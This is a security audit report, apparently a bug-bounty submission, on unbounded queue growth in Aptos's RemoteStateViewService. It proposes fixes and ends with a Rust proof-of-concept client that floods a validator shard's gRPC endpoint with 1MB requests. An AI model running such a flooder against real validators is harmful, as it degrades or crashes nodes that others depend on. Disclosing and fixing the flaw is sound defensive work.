# Audit Report

## Title
Unbounded Queue Growth in RemoteStateViewService Enables Memory Exhaustion and Validator Slowdown via Request Flooding

## Summary
The `RemoteStateViewService` accepts state view requests over gRPC without rate limiting or authentication, and queues them using unbounded channels and Rayon's unbounded work queue. An attacker with network access to the service endpoint can flood it with malicious requests, causing unbounded memory growth, validator slowdown, and potential out-of-memory crashes.

## Finding Description

The `RemoteStateViewService` in the sharded block executor infrastructure has multiple unbounded queues that can be exploited for resource exhaustion:

**Vulnerable Code Path:**

1. The gRPC server receives messages at the `simple_msg_exchange` endpoint without authentication or rate limiting: [1](#0-0) 

2. Messages are forwarded to handlers via **unbounded crossbeam channels**: [2](#0-1) 

3. The `RemoteStateViewService.start()` method receives messages in a loop and spawns work on a Rayon thread pool for each request: [3](#0-2) 

4. The Rayon thread pool is created with a fixed number of threads (default: CPU count): [4](#0-3) 

**The Vulnerability:**

When `thread_pool.spawn()` is called but all worker threads are busy processing existing requests, Rayon queues the work in an **unbounded internal queue**. This is documented Rayon behavior—work-stealing queues grow without limit.

**Attack Scenario:**

1. Attacker sends a flood of `RemoteKVRequest` messages to the gRPC endpoint faster than they can be processed
2. Requests accumulate in TWO unbounded queues:
   - The crossbeam channel between the gRPC server and `RemoteStateViewService` (created with `unbounded()`)
   - Rayon's internal work queue when all threads are saturated
3. Each queued closure captures `Arc` clones of `state_view` and `kv_tx`, consuming additional memory
4. The queues grow unbounded until the process runs out of memory or becomes unresponsive

**Broken Invariants:**

This violates **Invariant #9**: "Resource Limits: All operations must respect gas, storage, and computational limits." The service has no limits on queue depth, memory usage, or request rate.

## Impact Explanation

This vulnerability qualifies for **HIGH severity** ($50,000) under the Aptos bug bounty program because it directly causes:

- **Validator node slowdowns**: Processing malicious requests consumes CPU cycles and delays legitimate state view requests needed for block execution
- **Memory exhaustion**: Unbounded queue growth leads to out-of-memory conditions, potentially crashing the validator node
- **Consensus participation degradation**: A slowed or crashed validator cannot participate effectively in AptosBFT consensus

The service is used in production when remote sharded execution is enabled: [5](#0-4) 

While the service is intended for internal shard-to-shard communication, the lack of authentication means any network peer that can reach the configured `SocketAddr` can exploit this vulnerability.

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

**Attack Requirements:**
- Network access to the gRPC endpoint (configured via `--remote-executor-addresses`)
- Ability to send gRPC messages (no authentication required)
- No validator insider access needed

**Attack Complexity:**
- LOW - Simply requires sending valid gRPC messages in a loop
- The attacker doesn't need to craft complex payloads; even empty `RemoteKVRequest` messages will queue work

**Exploitation Scenarios:**
1. **Misconfigured deployment**: If the service is exposed to untrusted networks
2. **Compromised network peer**: Any node on the same network segment
3. **Malicious shard operator**: In a multi-operator sharded execution setup
4. **Internal attacker**: Anyone with access to the internal network

The vulnerability exists in the code regardless of deployment configuration. Defense-in-depth principles require application-level protections even when network-level isolation is intended.

## Recommendation

Implement multiple defensive layers:

**1. Add bounded queues with backpressure:**

Replace unbounded channels with bounded channels that apply backpressure when full:

```rust
// In NetworkController::create_inbound_channel()
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    let (inbound_sender, inbound_receiver) = bounded(1000); // Bounded queue
    
    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);
    
    inbound_receiver
}
```

**2. Implement request rate limiting:**

Add a token bucket rate limiter in the gRPC handler:

```rust
// In GRPCNetworkMessageServiceServerWrapper
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    // Check rate limit before processing
    if !self.rate_limiter.check_rate_limit(request.remote_addr()) {
        return Err(Status::resource_exhausted("Rate limit exceeded"));
    }
    // ... existing code
}
```

**3. Add authentication/authorization:**

Implement mutual TLS or token-based authentication to verify shard identity:

```rust
// Add authentication check in simple_msg_exchange
let peer_addr = request.remote_addr()
    .ok_or_else(|| Status::unauthenticated("No peer address"))?;
    
if !self.authorized_peers.contains(&peer_addr) {
    return Err(Status::permission_denied("Unauthorized peer"));
}
```

**4. Monitor queue depth:**

Add metrics and alerts for queue depth:

```rust
pub fn start(&self) {
    while let Ok(message) = self.kv_rx.recv() {
        // Monitor queue depth
        QUEUE_DEPTH_METRIC.set(self.kv_rx.len() as i64);
        
        if self.kv_rx.len() > QUEUE_DEPTH_THRESHOLD {
            warn!("Queue depth exceeding threshold: {}", self.kv_rx.len());
        }
        // ... existing code
    }
}
```

## Proof of Concept

```rust
// Attacker client to demonstrate the vulnerability
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use std::time::Duration;
use tokio::time::sleep;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the vulnerable RemoteStateViewService endpoint
    let target_addr = "http://validator-shard-0:52200"; // Example address
    let mut client = NetworkMessageServiceClient::connect(target_addr).await?;
    
    println!("Starting DoS attack on RemoteStateViewService...");
    
    // Flood the service with requests
    for i in 0..100000 {
        let request = tonic::Request::new(NetworkMessage {
            message: vec![0u8; 1024 * 1024], // 1MB payload per request
            message_type: "remote_kv_request".to_string(),
        });
        
        // Send asynchronously without waiting for response
        tokio::spawn(async move {
            let _ = client.simple_msg_exchange(request).await;
        });
        
        if i % 1000 == 0 {
            println!("Sent {} requests", i);
        }
        
        // Send requests faster than they can be processed
        sleep(Duration::from_micros(10)).await;
    }
    
    println!("Attack complete. Target should be experiencing memory exhaustion.");
    Ok(())
}
```

**Expected Result:**
- The validator's memory usage grows unbounded as requests queue up
- Legitimate state view requests are delayed by seconds or minutes
- The validator eventually crashes with OOM or becomes unresponsive
- Consensus participation degrades or stops entirely

**To verify the vulnerability:**
1. Deploy a remote sharded executor with the service exposed
2. Run the PoC client to flood requests
3. Monitor memory usage: `watch -n 1 'ps aux | grep executor-service'`
4. Observe queue depth metrics and response time degradation
5. Confirm legitimate requests are blocked/delayed

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L92-115)
```rust
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/mod.rs (L128-136)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L30-36)
```rust
        let num_threads = num_threads.unwrap_or_else(num_cpus::get);
        let thread_pool = Arc::new(
            rayon::ThreadPoolBuilder::new()
                .num_threads(num_threads)
                .build()
                .unwrap(),
        );
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L64-72)
```rust
    pub fn start(&self) {
        while let Ok(message) = self.kv_rx.recv() {
            let state_view = self.state_view.clone();
            let kv_txs = self.kv_tx.clone();
            self.thread_pool.spawn(move || {
                Self::handle_message(message, state_view, kv_txs);
            });
        }
    }
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L261-267)
```rust
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
```
